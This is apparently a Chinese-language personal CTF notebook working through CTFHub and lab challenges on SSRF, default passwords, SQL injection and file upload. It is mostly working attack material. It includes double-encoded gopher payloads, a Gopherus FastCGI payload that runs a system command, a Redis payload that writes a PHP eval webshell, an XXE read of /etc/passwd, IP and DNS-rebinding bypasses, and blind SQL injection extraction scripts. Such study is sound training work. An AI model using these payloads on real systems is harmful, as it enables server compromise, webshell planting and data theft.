4. 接下来用`file:///proc/net/arp`看内网里有哪些主机是存活的，读取出来是空的。是因为只有进行通信后才会有arp表，可以尝试访问内网里的所有ip,可以把1-254访问一遍。可以用bp爆破，发现有一些是存活的![](/image/87.png)21-24是开着的
5. 接下来要查看内网主机开放了哪些端口，使用dict://伪协议。还是用bp爆破，因为这次爆破要同时爆破两个，所以爆破模式要用cluster bomb(集束炸弹),爆破设置![](/image/88.png)![](/image/89.png)列表里输入几个常见的端口，最后通过长度看端口是否开启，![](/image/90.png)可以看到21-24的80端口都是开的。有回显内容。
6. 接下来可以通过http协议进行目录扫描，因为是用来打内网，所以不可以使用dirsearch扫描。用bp爆破`http://172.72.23.22/1.php`，字典就用kali自带的字典，kali里`/usr/share/wordlists/dirb/commont.txt`根据长度判断，扫到三个`index.php shell.php phpinfo.php`也可以把后缀同时爆破一下，例如txt,zip,php等
7. 发现shell.php里有![](/image/93.png)要发送get请求，可以借助gopher伪协议发送get,post请求(get请求可以直接`http://172.72.23.22/shell.php?cmd=cat%20flag`,但是post只可以用gopher)。但是gopher发送请求时有一个问题，![](/image/91.png)![](/image/92.png)可以看到他自动把第一个字符吞掉了。所以用gopher时要在第一位填充一个没用的字符占位。
   首先**get请求**poc构造:需要保留头部信息
   路径 GET /shell.php HTTP/1.1
     目标ip地址 Host: 172.72.23.22(记得在最后一定加一个换行符，因为post内容和头部信息之间有一个空行)
      最终构造的payload`gopher://172.72.23.22:80/_GET%20/shell.php%3fcmd=cat%20flag%20HTTP/1.1%0d%0AHost:%20172.72.23.22%0d%0A`(我不知道是哪里错了，就是成功不了)可以发送get提交，但有另一种方式可以，就是发送到repeater模块后对构造好的内容进行url编码![](/image/94.png)复制这一段内容到`gopher%3A%2F%2F172.72.23.22%3A80%2F_`后,对这一段内容进行两次url编码(因为可访问的服务器要进行一次url解码，内网主机也要进行一次url解码)，发送成功![](/image/95.png)记得把回车符也复制粘贴上，url编码时也要把后面的回车符带上  
8. 如果要发送post
```
POST /shell.php HTTP/1.1
Host: 172.72.23.22
Content-Length: 6  
Content-Type: application/x-www-form-urlencoded   

cmd=ls
```
道理同上
### 回环地址绕过
题目要访问127.0.0.1下的flag.php但访问后失败了，这时就要绕过，一般ip地址都是用点分十进制，但是ip地址是可以用二进制，八进制，十六进制的。127.0.0.1转二进制是`0b01111111000000000000000000000001`转八进制`017700000001`转十六进制`0x7f000001`纯十进制表达方式是`2130706433`,这些都可以通过计算器的程序员模式计算。只要把`http://127.0.0.1/flag.php`里的127.0.0.1替换成上述任意一个就行。
### 302重定向
直接访问`http://127.0.0.1/flag.php`直接回显不了，因为检测到是内网ip,这时就需要用自己的服务器的公网地址。![](/image/96.png)把自己的内网7777端口映射的公网，在创建一个文件![](/image/97.png)让他去访问127.0.0.1/flag.php界面，然后用`php -s 0.0.0.0:7777`去监听端口，输入`http://121.89.81.39:7777/index.php`这样就会重定向到`127.0.0.0/flag.php`并把内容回显到界面

### DNS重绑定攻击
**原理**:利用服务器两次DNS(将域名解析为ip地址)解析同一域名的时间间隙，更换域名后的ip,达到突破同源策略或绕过waf进行ssrf的目的。
**攻击方式**：第一次DNS解析的ip设为合法ip以绕过host合法性检查,第二次DNS解析的ip设为内网ip.DNS第二次解析时更换url对应的ip，在TTL（域名和ip绑定绑定关系的Cache存活的最长时间）结束，缓存失效后，重新访问此url就能获取被更换后的ip,这样ssrf就访问到内网了。并且这一过程域名不变，绕过浏览器的安全检测。
这里有一个[网站](https://lock.cmpxchg8b.com/rebinder.html)可以提供TTL为零的DNS解析，可以生成一个DNS解析，![](/image/98.png)把生成的域名放输入框里，`http://deb74166.7f000001.rbndr.us/flag.php`点击提交，有概率成功，可以多试几次。
### gopher发送POST请求
右键看源代码，可以看到post参数为ip`<input type="text" class="form-control" id="ip" name="ip" placeholder="请输入 IP 地址">`
```
POST / HTTP/1.1
Host: 172.72.23.24
Content-Length: 12
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1


```
复制到抓到的包的后面再两次url编码![](/image/99.png)执行成功。
### XXE漏洞利用
根据源码可知这是一个xxe的漏洞，可以知道提交到doLogin.php了，还是post提交，所以可以构造payload,因为他的用户名在界面是回显的。所以在用户名处写一个
```
POST /doLogin.php HTTP/1.1
Host: 172.72.23.25
Content-Length: 124
Content-Type: application/xml;charset=utf-8

<!DOCTYPE root [<!ENTITY niu SYSTEM "file:///etc/passwd">]><user><username>&niu;</username><password>admin</password></user>


```
把这个东西用gopher伪协议提交，利用成功
***
## ctfhub上SSRF部分
### 内网访问
直接访问内网`?url=http://127.0.0.1/flag.php`得到flag
### 伪协议读取文件
访问网页目录下的flag.php,`?url=file:///var/www/html/flag.php`flag在注释里
### 端口扫描
爆破端口从8000-9000,看响应长度,发现端口是8044，flag在响应里![](/image/100.png)
### POST请求
先看一下网页里有哪些文件，用bp字典爆破，爆破出一个flag.php和index.php，![](/image/101.png)看wp好像还有一个302.php没爆出来，访问flag.php得到一个`<!-- Debug: key=2b5fe797888b5363a85c8595bb5b774f-->`,index.php的内容可以用file://伪协议读取出来，
```php
|   |
|---|
|<?php|
||
|error_reporting(0);|
||
|if (!isset($_REQUEST['url'])){|
|header("Location: /?url=_");|
|exit;|
|}|
||
|$ch = curl_init();|
|curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);|
|curl_setopt($ch, CURLOPT_HEADER, 0);|
|curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);|
|curl_exec($ch);|
|curl_close($ch);|
```
再读一下flag.php源码，
```php
|   |
|---|
|<?php|
||
|error_reporting(0);|
||
|if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {|
|echo "Just View From 127.0.0.1";|
|return;|
|}|
||
|$flag=getenv("CTFHUB");|
|$key = md5($flag);|
||
|if (isset($_POST["key"]) && $_POST["key"] == $key) {|
|echo $flag;|
|exit;|
|}|
|?>|
||
|<form action="/flag.php" method="post">|
|<input type="text" name="key">|
|<!-- Debug: key=<?php echo $key;?>-->|
|</form>|
```
读取302.php源码
```php
<?php if(isset($_GET['url'])){ header("Location: {$_GET[‘url‘]}"); exit; } highlight_file(__FILE__);
```
可以用gopher伪协议发送post请求，构造poc
```
POST /flag.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 36
Content-Type: application/x-www-form-urlencoded

key=2b5fe797888b5363a85c8595bb5b774f
```
把他两次url编码发送得到flag![](/image/102.png)但这个flag好像是个彩蛋flag,它提示我环境过期了，但是没过期，不知道咋办了，找到解决方法了，把
```
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Length: 36
Content-Type: application/x-www-form-urlencoded

key=d37598d50c0af4117e7caf76cd317b69
```
先用hackbar一次url编码，只编码特殊字符，编码后把%0A替换成%0D%0A,因为 Gopher协议包含的请求数据包中，可能包含有`=`、`&`等特殊字符，避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把`%`后的字节当做普通字节。再进行一次url编码，得到payload`http://challenge-1f215c1c97a2b737.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Length:%252036%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey=d37598d50c0af4117e7caf76cd317b69`得到真正的flag![](/image/103.png)再写仔细一点。就是先对原来的poc进行一次url编码，不能用hackbar编码，可以用[在线URL解码编码工具_蛙蛙工具](https://www.iamwawa.cn/urldecode.html)进行编码，因为这个`encodeURI` 方法不会对ASCII字母、数字、`~!@#$&*()=:/,;?+'` 编码,之前一直不成就是因为这个。一次编码后得到
~~~
POST%20/flag.php%20HTTP/1.1%0AHost:%20127.0.0.1:80%0AContent-Length:%2036%0AContent-Type:%20application/x-www-form-urlencoded%0A%0Akey=d37598d50c0af4117e7caf76cd317b69
~~~
再把%0A替换为%D%0A,得到
```
POST%20/flag.php%20HTTP/1.1%0D%0AHost:%20127.0.0.1:80%0D%0AContent-Length:%2036%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Akey=d37598d50c0af4117e7caf76cd317b69
```
再进行一次url编码，得到
```
POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.1:80%250D%250AContent-Length:%252036%250D%250AContent-Type:%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey=d37598d50c0af4117e7caf76cd317b69
```
这就是最终paylaod.(因为编码问题卡好久)
### 上传文件
访问`?url=http://127.0.0.1/flag.php`发现没提交键，可以修改前端代码加一句`<input type="submit" name="submit">`![](/image/104.png)就有提交键了，随便上传一个文件抓包，看到包是
```
POST /flag.php HTTP/1.1
Host: challenge-6953d3a0ccc0ef99.sandbox.ctfhub.com:10800
Content-Length: 284
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://challenge-6953d3a0ccc0ef99.sandbox.ctfhub.com:10800
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvh6RGQR7rSltdV22
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-6953d3a0ccc0ef99.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundaryvh6RGQR7rSltdV22
Content-Disposition: form-data; name="file"; filename="1.txt"
Content-Type: text/plain

123456
------WebKitFormBoundaryvh6RGQR7rSltdV22
Content-Disposition: form-data; name="submit"

提交
------WebKitFormBoundaryvh6RGQR7rSltdV22--

```
把这个包按上一题的操作，先url加密，把%0A替换为%0D%0A,再加密一次，最终payload
```
http://challenge-6953d3a0ccc0ef99.sandbox.ctfhub.com:10800/?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520challenge-6953d3a0ccc0ef99.sandbox.ctfhub.com:10800%250D%250AContent-Length:%2520284%250D%250ACache-Control:%2520max-age=0%250D%250AAccept-Language:%2520zh-CN,zh;q=0.9%250D%250AOrigin:%2520http://challenge-6953d3a0ccc0ef99.sandbox.ctfhub.com:10800%250D%250AContent-Type:%2520multipart/form-data;%2520boundary=----WebKitFormBoundaryvh6RGQR7rSltdV22%250D%250AUpgrade-Insecure-Requests:%25201%250D%250AUser-Agent:%2520Mozilla/5.0%2520(Windows%2520NT%252010.0;%2520Win64;%2520x64)%2520AppleWebKit/537.36%2520(KHTML,%2520like%2520Gecko)%2520Chrome/140.0.0.0%2520Safari/537.36%250D%250AAccept:%2520text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7%250D%250AReferer:%2520http://challenge-6953d3a0ccc0ef99.sandbox.ctfhub.com:10800/?url=127.0.0.1/flag.php%250D%250AAccept-Encoding:%2520gzip,%2520deflate,%2520br%250D%250AConnection:%2520keep-alive%250D%250A%250D%250A------WebKitFormBoundaryvh6RGQR7rSltdV22%250D%250AContent-Disposition:%2520form-data;%2520name=%2522file%2522;%2520filename=%25221.txt%2522%250D%250AContent-Type:%2520text/plain%250D%250A%250D%250A123456%250D%250A------WebKitFormBoundaryvh6RGQR7rSltdV22%250D%250AContent-Disposition:%2520form-data;%2520name=%2522submit%2522%250D%250A%250D%250A%25E6%258F%2590%25E4%25BA%25A4%250D%250A------WebKitFormBoundaryvh6RGQR7rSltdV22--
```
得到flag
### FastCGI协议
关于FastCGI可以参考[这篇文章](https://blog.csdn.net/mysteryflower/article/details/94386461)这题可以用一个工具gophprus![](/image/105.png)直接生成payload,得到paylaod再url加密一次。![](/image/106.png)得到
```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH59%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3B%04%00%3C%3Fphp%20system%28%27cat%20/f%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
```
这个再加密一次得到最终payload
```
gopher://127.0.0.1:9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%25F6%2506%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2502CONTENT_LENGTH59%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2509SCRIPT_FILENAMEindex.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%253B%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520/f%252A%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
```
### Redis协议
这一关还是用gopherus工具生成paylaod![](/image/107.png)生成的paylaod再url加密一次得到最终paylaod
```
gopher://127.0.0.1:6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252430%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_GET%255Bcmd%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
```
输入后等了好一会发现504time-out了，但一句话木马其实是注入成功了，访问shell.php，再执行指令就行了
### URL Bypass
这道题说url必须以http://notfound.ctfhub.com开头，但要访问的是127.0.0.1这里要用到一个技巧，就是`http://127.0.0.1@www.baidu.com`这里127.0.0.1作为用户名，www.baidu.com作为主机名，实际上访问的还是`www.baidu.com`![](/image/108.png)所以只要输入`http://notfound.ctfhub.com@127.0.0.1/flag.php`
### 数字IP Bypass
这道题前面笔记有，可以用十进制，八进制，十六进制写ip绕过
- 八进制`017700000001/flag.php`
- 十进制`2130706433/flag.php`
- 十六进制`0x7f000001/flag.php`
都是可以的
### 302跳转 Bypass
file读取一下index.php有一句`if (preg_match("/127\|172\|10\|192/", $url)) {exit("hacker! Ban Intranet IP");}`但是没有禁止localhost,可以用`localhost/flag.php`当然了也可以用十六进制绕过。但这道题真正考的是302跳转，可以用一下自己的服务器试一下，开启我的服务器，在网页目录写一个302.php，也就是![](/image/111.png)内容是
```php
<?php
header("Location:http://127.0.0.1/flag.php");//实现重定向到http://127.0.0.1/flag.php
```
最终![](/image/112.png)paylaod就是`http://[公网ip]/302.php`
### DNS重绑定 Bypass
与上面的笔记一样，![](/image/109.png)paylaod`?url=7f000003.7f000001.rbndr.us/flag.php`
又ak一个![](/image/110.png)
## 密码口令
### 弱口令
直接用字典爆破，用户名用admin,爆出来密码是admin888
### 默认口令
因为有验证码，所以不易爆破，可以查找一下，浏览器搜索亿邮网关，检索可用信息发现使用说明手册，可能含有默认密码,找到![](/image/113.png)但是不行，其实有很多默认口令，最后用eyougw/admin@(eyou)成功
## SQL注入
### 整数型注入
试一下1，成功，试一下`1'`无回显，说明没有包裹，接下来`1 order by 2`测出有两个，`-1 union select 3,4`测出两个位置都回显,再`-1 union select database(),2`找到数据库名为sqli,再查表名`-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'`得到` flag,news`再`-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag'`查字段得到`flag`,最后输出数据`-1 union select 1,group_concat(flag) from sqli.flag`得到flag
### 字符型注入
输入1，可以看到是单引号包裹的，输入`1' order by 2#`道理同上，这里有一个要注意的点，就是如果用hackbar,就要把#url加密，不然不成功。
### 报错注入
输入`1 and (updatexml(1,concat(0x7e,database(),0x7e),1))#`得到sqli,再输入`1 and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='sqli'),0x7e),1))#`得到flag,news,再输入`1 and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='sqli' and table_name='flag'),0x7e),1))%23`得到flag,最后`1 and (updatexml(1,concat(0x7e,(select group_concat(flag) from sqli.flag ),0x7e),1))%23`得到flag
### 布尔盲注
直接用脚本
```python
import requests  
url = input("请输入url:")  
TRUE_TEXT='query_success'  
  
def check(payload):  
    r =requests.get(url,params={"id":payload})  
    # r =requests.post(url,data={"name":payload})  
    return TRUE_TEXT in r.text  
result =""  
chars = r"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}_+-*/@!#$%^&()[]=;:,.?<>~`'\" \n\r"  
  
length =0  
for i in range(1,500):  
    #1'and length((select database()))={i}--  
    #1'and length((select group_concat(table_name) from information_schema.tables where table_schema='security'))={i}--    
    #1'and length((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'))={i}--    
    #1'and length((select group_concat(username,password) from users))={i}--    
    payload = f"1 and length((select database()))={i}-- "  
    if check(payload):  
        length =i  
        break  
print(f"length = {length}")  
  
for i in range(1,length+1):  
    for c in chars:  
        #1'and substr((select database()),{i},1)='{c}'--  
        #1'and substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),{i},1)='{c}'--        #1'and substr((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),{i},1)='{c}'--        #1'and substr((select group_concat(username,password) from users),{i},1)='{c}'--        
        payload = f"1 and substr((select database()),{i},1)='{c}'-- "  
        if check(payload):  
            result += c;  
            break  
    print(result)  
print(f"最终结果:{result}")
```
把payload稍微改一下就能用了，这道题没有用单引号包裹。得到flag![](/image/114.png)
### 时间盲注
直接脚本
```python
import requests  
import time  
  
url=input("请输入url:")  
  
def check(payload):  
    start_time = time.time()  
    requests.get(url,params={"id":payload},timeout=3)  
    #r=requests.post(url,data={"id":payload},timeout=1)  
    response_time = time.time()-start_time  
    for _ in range(3):#通过增加多次校验（循环 3 次判断延迟）来提升匹配准确性  
        if response_time>=1.9:  
            return 1  
        else:  
            return 0  
  
result=""  
chars=r"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_+-*/@!#$%^&()[]=;:,.?<>~`'\" \n\r"  
length=0  
for i in range(500):  
    #1'and if(length((select database()))={i},sleep(2),1)--  
    #1'and if(length((select group_concat(table_name) from information_schema.tables where table_schema='security'))={i},sleep(2),1)--    #1'and if(length((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'))={i},sleep(2),1)--    #1'and if(length((select group_concat(username,password) from users))={i},sleep(2),1)--    
    payload=f"1 and if(length((select group_concat(flag) from flag))={i},sleep(2),1)-- "  
    if check(payload):  
        length=i  
        break  
print(f"长度是{length}")  
  
for i in range(1,length+1):  
    for c in chars:  
        #1'and if(substr((select database()),{i},1)='{c}',sleep(2),1)--  
        #1'and if(substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),{i},1)='{c}',sleep(2),1)--        #1'and if(substr((select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),{i},1)='{c}',sleep(2),1)--        #1'and if(substr((select group_concat(username,password) from users),{i},1)='{c}',sleep(2),1)--        
        payload=f"1 and if(substr((select group_concat(flag) from flag),{i},1)='{c}',sleep(2),1)-- "  
        if check(payload):  
            result += c  
            break  
    print(result)  
  
print(f"最终结果是{result}")
```
得到flag
### MySQL结构
与第一关几乎一样
### cookie注入
注入点变为了cookie，其余方法一样
### UA注入
注入点变为了User-Agent,其余一样
### Refer注入
注入点变为了referer,其余一样
### 过滤空格
空格可以用`/**/`或`()`代替，`-1/**/union/**/select/**/2,group_concat(hvjeurmalr)/**/from/**/jtscjysifd%23`得到flag
### AK
![](/image/115.png)
## 文件上传
### 无验证
无任何过滤，直接上传一句话木马，连接蚁剑
### 前端验证
可以看到前端有一个![](/image/116.png)调用下面的过滤函数，所以可以把onsubmit删掉，接下来就和无验证一样了。也可以先上传一个jpg文件绕过一下。
### MIME绕过
抓包把content-type字段改为`image/jpeg`
### 文件头检查
只要在一句话木马开头加一个`GIF89a`伪装成图片，就可以了，看源码`if (!in_array(bin2hex($bin), ["89504E47", "FFD8FFE0", "47494638"]))`
### .htaccess
编写一个.htaccess文件内容为
```
AddType application/x-httpd-php .jpg
```
先上传这个文件，再上传1.jpg文件，这样他就会被当作php文件解析，一句话木马就会执行。
### 00截断
0x00是字符串的结束标识符，攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。
数据包中必须含有上传后文件的目录情况才可以用，比如数据包中存在path: uploads/，那么攻击者可以通过修改path的值来构造paylod: uploads/aa.php%00(这是php5.2版本特有的漏洞)
抓到的包![](/image/117.png)这是可以改包为`/?road=/var/www/html/uplaod/111.php%00`再写入一句话木马，这时再放包，就上传成功了，在用蚁剑连接`http://challenge-eafdb15e123fd8bf.sandbox.ctfhub.com:10800/upload/111.php`得到flag
### 双写后缀
因为把php后缀给删掉了，可以双写绕过把文件名改为`1.pphphp`,这样一删除php剩下的就成php了。这样上传得到flag。看源码
```php
 $blacklist = array("php", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess", "ini");
    $name = str_ireplace($blacklist, "", $name);
```
可以看到是直接把黑名单里的内容替换为空了。并且只替换一次，这样替换风险很大，可以双写绕过。![](/image/118.png)








   
   





